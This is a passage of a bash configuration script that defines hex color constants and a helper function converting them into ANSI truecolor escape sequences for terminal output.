COLOR_DARK="#332D2D"
COLOR_PINK="#C2527A"
COLOR_PURPLE="#7952B3"
COLOR_DOG="#C68642"
COLOR_ORANGE="#E8703A"

COLOR_RESET="\033[0m"

# -- ANSI (truecolor para bash scripts) --
_hex() { local h="${1#"#"}"; echo "\e[38;2;$((16#${h:0:2}));$((16#${h:2:2}));$((16#${h:4:2}))m"; }

ANSI_PRIMARY=$(_hex "$COLOR_PRIMARY")
ANSI_SECONDARY=$(_hex "$COLOR_SECONDARY")
ANSI_SUCCESS=$(_hex "$COLOR_SUCCESS")
ANSI_DANGER=$(_hex "$COLOR_DANGER")
ANSI_WARNING=$(_hex "$COLOR_WARNING")
ANSI_INFO=$(_hex "$COLOR_INFO")
ANSI_LIGHT=$(_hex "$COLOR_LIGHT")
ANSI_DARK=$(_hex "$COLOR_DARK")
ANSI_PINK=$(_hex "$COLOR_PINK")
ANSI_PURPLE=$(_hex "$COLOR_PURPLE")
ANSI_DOG=$(_hex "$COLOR_DOG")
ANSI_ORANGE=$(_hex "$COLOR_ORANGE")
```